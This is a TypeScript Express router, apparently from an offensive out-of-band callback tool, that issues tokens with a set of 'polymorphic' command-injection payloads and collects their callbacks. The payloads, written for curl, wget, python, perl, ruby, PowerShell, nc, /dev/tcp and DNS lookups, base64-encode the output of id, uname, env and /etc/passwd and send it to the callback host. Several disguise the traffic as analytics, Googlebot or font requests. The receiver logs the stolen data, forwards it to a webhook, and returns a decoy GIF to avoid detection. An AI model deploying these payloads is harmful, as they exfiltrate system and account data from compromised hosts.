import { Router, type IRouter, type Request, type Response } from "express";
import { randomBytes } from "crypto";
import {
  addHit, getHits, clearHits, oobEvents,
  isRateLimited, generateToken, type OobHit,
} from "../oob/oobStore.js";
import { createLogger } from "../lib/logger.js";
import { getOobCbBase } from "../lib/tunnelUrl.js";

const log    = createLogger("oob");
const router: IRouter = Router();

/* ── Webhook forwarding (optional — set OOB_WEBHOOK_URL env var) ───── */
const WEBHOOK_URL = (process.env["OOB_WEBHOOK_URL"] ?? "").trim();

async function forwardToWebhook(hit: OobHit): Promise<void> {
  if (!WEBHOOK_URL) return;
  try {
    await fetch(WEBHOOK_URL, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(hit),
      signal:  AbortSignal.timeout(5_000),
    });
  } catch (err) {
    log.warn({ err }, "oob: webhook forward failed");
  }
}

/* ── Decode base64 data from hit ────────────────────────────────────── */
function tryDecodeB64(raw: string): string {
  try {
    const decoded = Buffer.from(raw, "base64").toString("utf8");
    if (decoded.length > 0 && decoded.length <= raw.length * 2) return decoded;
    return raw;
  } catch {
    return raw;
  }
}

function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
  const cb = `${base}/${token}`;

  let cbHost = "localhost";
  let cbPort = "80";
  try {
    const u = new URL(base);
    cbHost  = u.hostname;
    cbPort  = u.port || (u.protocol === "https:" ? "443" : "80");
  } catch { /* keep defaults */ }

  return {
    wget_pixel:
      `wget -qO/dev/null --user-agent="Mozilla/5.0 AppleWebKit/537.36" "${cb}/pixel.gif?id=$(hostname|base64 -w0 2>/dev/null||hostname|base64)&d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    analytics_beacon:
      `_d=$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64); curl -sk -H "Referer: https://www.google-analytics.com/collect" -H "Content-Type: text/plain" "${cb}?v=1&tid=UA-000000&cid=\${_d:0:8}&t=pageview&dp=%2F&d=\${_d}" 2>/dev/null &`,

    python3_urllib:
      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();req=u.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'});u.urlopen(req)" 2>/dev/null &`,

    curl_font_fetch:
      `curl -sk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -H "Sec-Fetch-Dest: font" -H "Sec-Fetch-Mode: cors" "${cb}?d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    curl_post_xhr:
      `_o=$(id && uname -a && cat /etc/passwd 2>/dev/null|head -5); curl -sk --data-binary "id=$(hostname)&data=$(echo "\${_o}"|base64 -w0 2>/dev/null||echo "\${_o}"|base64)" "${cb}" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With: XMLHttpRequest" 2>/dev/null &`,

    bash_pipe_raw:
      `(id;uname -a;env;cat /etc/passwd 2>/dev/null|head -5)|curl -sk --data-binary @- '${cb}' 2>/dev/null &`,

    curl_exfil:
      `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${cb}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)" 2>/dev/null`,

    perl_http:
      `perl -MLWP::UserAgent -e "use MIME::Base64;my \$ua=LWP::UserAgent->new;my \$d=encode_base64(\`id && uname -a\`);chomp(\$d);\$ua->get('${cb}?d='.\$d)" 2>/dev/null &`,

    python3_socket:
      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cbHost}',${cbPort}));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n');s.close()" 2>/dev/null &`,

    bash_devtcp:
      `exec 3>/dev/tcp/${cbHost}/${cbPort} 2>/dev/null && printf 'GET /api/oob/cb/${token}?d='$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64)' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n'>&3 && exec 3>&- 2>/dev/null &`,

    java_url:
      `java -cp . -e "new java.net.URL(\\"${cb}?d=\\"+java.util.Base64.getEncoder().encodeToString(Runtime.getRuntime().exec(new String[]{\\"sh\\",\\"-c\\","id && uname -a\\"}).getInputStream().readAllBytes())).openStream().close();" 2>/dev/null & python3 -c "import urllib.request,base64,subprocess;urllib.request.urlopen('${cb}?d='+base64.b64encode(subprocess.check_output(['sh','-c','id && uname -a'],stderr=-1)).decode())" 2>/dev/null &`,

    powershell_iwr:
      `powershell -NoP -NonI -W Hidden -c "iwr -Uri '${cb}?d='+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((iex 'id 2>&1')))+'' -UseBasicParsing" 2>/dev/null & cmd /c "powershell -c \"$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c id 2^>^&1)));iwr -Uri '${cb}?d='+$d -UseBasicParsing\" 2>nul"`,

    ruby_oob:
      `ruby -e "require 'net/http';require 'base64';d=Base64.encode64(\`id && uname -a\`.strip);Net::HTTP.get(URI.parse('${cb}?d='+URI.encode_www_form_component(d)))" 2>/dev/null &`,

    nc_bash:
      `echo "$(id && uname -a && cat /etc/passwd 2>/dev/null|head -3)" | nc -w3 ${cbHost} ${cbPort} 2>/dev/null &`,

    dns_lookup:
      `nslookup $(id|md5sum|cut -c1-16).${cbHost} 2>/dev/null & dig +short $(hostname|tr '.' '-').${cbHost} 2>/dev/null &`,
  };
}

/* ── GET /oob/token ──────────────────────────────────────────────────── */
router.get("/oob/token", (req: Request, res: Response) => {
  const token = generateToken();
  const base  = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
  log.info({ token: token.slice(0, 8) }, "oob: token issued");
  res.json({
    token,
    cbUrl:    `${base}/${token}`,
    payloads: buildPolymorphicPayloads(base, token),
  });
});

/* ── Callback receiver (GET + POST) ─────────────────────────────────── */
function receiveCallback(req: Request, res: Response): void {
  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    || req.socket.remoteAddress
    || "?";

  if (isRateLimited(sourceIp)) {
    res.status(429).send("rate limited");
    return;
  }

  const token   = (req.params as Record<string, string>)["token"] ?? "default";
  const rawData = (req.query as Record<string, string>)["d"] ?? (req.query as Record<string, string>)["data"] ?? "";

  const query   = Object.fromEntries(
    Object.entries(req.query as Record<string, unknown>).map(([k, v]) => [k, String(v)]),
  );
  const bodyStr = typeof req.body === "string"
    ? req.body
    : (req.body && typeof req.body === "object" && Object.keys(req.body as object).length)
      ? JSON.stringify(req.body)
      : "";

  const hit: OobHit = {
    token,
    sourceIp,
    method:    req.method,
    path:      req.path,
    query,
    body:      bodyStr,
    headers:   Object.fromEntries(
      Object.entries(req.headers as Record<string, string | string[] | undefined>)
        .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : (v ?? "")]),
    ),
    receivedAt: new Date().toISOString(),
    // Attempt to auto-decode base64 data field
    decodedData: rawData ? tryDecodeB64(rawData) : undefined,
  };

  addHit(hit);
  oobEvents.emit("hit", hit);
  log.info({ token: token.slice(0, 8), sourceIp, method: req.method }, "oob: callback received");

  // Forward to external webhook if configured
  void forwardToWebhook(hit);

  // Send a pixel / 204 response to avoid triggering error detection in payloads
  res.setHeader("Content-Type", "image/gif");
  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64")); // 1×1 transparent GIF
}

router.get("/oob/cb/:token", receiveCallback);
router.post("/oob/cb/:token", receiveCallback);
router.get("/oob/cb",        receiveCallback);
router.post("/oob/cb",       receiveCallback);

/* ── GET /oob/hits — retrieve captured hits ─────────────────────────── */
router.get("/oob/hits", (_req: Request, res: Response) => {
  const hits = getHits();
  res.json({ count: hits.length, hits });
});

/* ── DELETE /oob/hits — clear hit log ──────────────────────────────── */
router.delete("/oob/hits", (_req: Request, res: Response) => {
  clearHits();
  res.json({ ok: true });
});

/* ── GET /oob/stats — hit statistics ────────────────────────────────── */
router.get("/oob/stats", (_req: Request, res: Response) => {
  const hits = getHits();
  const byToken: Record<string, number> = {};
  const byIp:    Record<string, number> = {};
  let   withData = 0;

  for (const h of hits) {
    byToken[h.token]    = (byToken[h.token]    ?? 0) + 1;
    byIp[h.sourceIp]    = (byIp[h.sourceIp]    ?? 0) + 1;
    if (h.decodedData)   withData++;
  }

  res.json({
    total:       hits.length,
    withData,
    uniqueTokens: Object.keys(byToken).length,
    uniqueIPs:    Object.keys(byIp).length,
    byToken,
    byIp,
    webhookConfigured: Boolean(WEBHOOK_URL),
  });
});

/* ── GET /oob/hits/stream — SSE live stream of incoming hits ─────────── */
router.get("/oob/hits/stream", (req: Request, res: Response) => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection",    "keep-alive");
  res.flushHeaders();

  // Drain existing hits first
  const existing = getHits();
  for (const h of existing) {
    res.write(`data: ${JSON.stringify(h)}\n\n`);
  }

  const onHit = (hit: OobHit) => {
    try { res.write(`data: ${JSON.stringify(hit)}\n\n`); } catch { /* client disconnected */ }
  };
  oobEvents.on("hit", onHit);

  // Keep-alive ping every 25s
  const ping = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
  }, 25_000);

  req.on("close", () => {
    oobEvents.off("hit", onHit);
    clearInterval(ping);
  });
});

export default router;
